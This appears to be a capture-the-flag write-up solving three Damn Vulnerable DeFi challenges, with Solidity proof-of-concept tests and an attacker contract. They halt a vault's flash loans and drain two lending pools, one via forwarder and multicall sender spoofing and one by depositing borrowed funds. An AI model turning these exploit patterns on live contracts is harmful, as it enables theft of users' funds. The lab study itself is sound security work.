### `Unstoppable::flashloan`, Flash loans can be haulted if balance of `Unstoppable::totalSupply` & `Unstoppable::totalAssets` are not 1:1. 

``` solidity 
        uint256 balanceBefore = totalAssets();
        // shares must be 1:1 with balance
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

### PoC: 
Any account can hault flash loans if they send `Unstoppable` an unexpected amount of assets. 

``` solidity 

    function test_unstoppable() public checkSolvedByPlayer {

        uint256 _totalsupply = vault.totalSupply();
        uint256 shares = vault.convertToShares(_totalsupply);

        token.transfer(address(vault), 1);
        console.log("balance of vault: %s", vault.totalAssets());
        console.log("total number of shares: %s", shares);

        vm.expectRevert();
        vault.flashLoan(recipient, address(token), 2e18, "");
    }

```

``` diff

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;
+    FlashLoanRecipient public recipient;

    function setUp() public {
        startHoax(deployer);
        // Deploy token and vault
+      recipient = new FlashLoanRecipient(token,vault);
        token = new DamnValuableToken();
```



``` solidity 
contract FlashLoanRecipient is IERC3156FlashBorrower {
    DamnValuableToken public token;
    UnstoppableVault public vault;

    constructor(DamnValuableToken _token, UnstoppableVault _vault) {
        token = _token;
        vault = _vault;
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        console.log("FlashLoan Recipient balance during execution: %s", DamnValuableToken(token).balanceOf(address(this)));

        DamnValuableToken(token).approve(address(vault), amount + fee);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }
}
```

---

### `NaiveReceiverPool::flashLoan`, Funds can be drained 

### PoC:
How to spot the bug:

1. Review NaiveReiverPool
    1. identify main point of interest, which is `NaiveReceiverPool::flashLoan`
    2. `NaiveReceiverPool::flashLoan` is using `FlashLoanReceiver::onFlashLoan` function to ensure that the borrower contract has successfully implemented and completed the `onFlashLoan` callback according to the ERC-3156 standard.
    3.  `_msgSender` function determines the true originator of a transaction, particularly when it’s forwarded by a relayer contract, like `BasicForwarder`. It checks if the `msg.sender` is the `trustedForwarder`. If so, it extracts the actual sender from the call data. If `msg.sender` is not the trusted forwarder, it simply returns `msg.sender`.
2. Review `Multicall` and `BasicForwarder`
    1. `Multicall`: has a single function that accepts an array of function call data to delegate call multiple functions in a single tx
    2. `BasicForwarder`: provides a way for users to "sign" transaction requests off-chain, including all the transaction details such as the target, value, gas, nonce, and deadline. This signed request is then handed to a relayer off-chain. The relayer, or another entity, can submit it on-chain by invoking the `execute` function with the signed request and associated data. The `execute` function then verifies the request’s validity by checking the signature, nonce, and other constraints before forwarding the transaction to the specified target contract.
3. Things we know so far:
    1. We know `Multicall` is used to initiate multiple delegate calls 
    2. `NaiveReceiverPool::flashLoan` is using `FlashLoanReceiver::onFlashLoan`
    3. We know the NaiveReceivePool’s balance has 10eth
    4. There is a fee of 1eth that the NaiveReceivePool receives per flashloan which increases `deposits[feeReceiver] **+=** *FIXED_FEE*;`
4. Attack process:
    1. Build the request, and fill out the request information 
    2. Invoke `BasicForwarder::execute` 
        1. Trusted Forwarder(BasicForwarder) is calling MultiCall with calldata to  `NaiveReceiverPool::flashloan` &  `NaiveReceiverPool::withdraw` 
            1. when `NaiveReceiverPool::flashloan` is invoked it will trigger `FlashLoanReceiver::onFlashLoan` → this will be called 10x
        2. 11th (last call) will trigger `BasicForwarder::withdraw`

``` solidity 

    function test_naiveReceiver() public checkSolvedByPlayer {
        // build the delegate call data that will be sent over to MultiCall
        bytes[] memory delegateData = new bytes[](11);
        for (uint256 i; i < 10; i++) {
            // building the first call, it will cal the flashloan 10x
            delegateData[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 1e18, ""));
        }
        // building second call
        uint256 amountToWithdraw = weth.balanceOf(address(pool)) + weth.balanceOf(address(receiver));
        delegateData[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (amountToWithdraw, payable(recovery))), bytes32(uint256(uint160(deployer))));
        
        bytes memory data;

        data = abi.encodeCall(pool.multicall, delegateData);

        // build the request 
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player, // from 
            address(pool), // target
            0, // value
            1000000, // gas
            forwarder.nonces(player), // players nonce
            data, // bytes: contains both calls, flash loan & withdraw. 
            1 days // deadline
        );
        
        bytes32 hash = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        ));

        // signing encoded hash with players private key and then separating the sig in three parts
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, hash);
        
        bytes memory sig = abi.encodePacked(r, s, v);

        forwarder.execute(request, sig);
    }

```
---




### `SideEntranceLenderPool::flashloan`, `address(this).balance` is used a check if the funds have been paid back

### PoC:
1. borrow money from the pool
2. side entrance lender pool contract calls execute function inside the attack contract and the execute function specifies to pay back what was borrowed
3. call withdraw 
4. transfer the funds over to the recovery address

``` solidity
    function test_sideEntrance() public checkSolvedByPlayer {
        AttackerContract attacker = new AttackerContract(address(pool), recovery, ETHER_IN_POOL);
        attacker.attack();
    }
```

``` solidity
contract AttackerContract {
    address public recovery;
    uint256 public amount;
    SideEntranceLenderPool public pool; 

    constructor(address _pool, address _recovery, uint256 _amount) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        amount = _amount;
    }

    receive() external payable {}

    function attack() public {
        // call flashloan 
        pool.flashLoan(amount);

        // withdraw the funds
        pool.withdraw();

        // transfer the funds over to the recovery account 
        payable(recovery).transfer(amount);
    }

    function execute() external payable {
        // deposit the flash loan amount back to the flash loan 
        pool.deposit{value: msg.value}();
    }
}
```
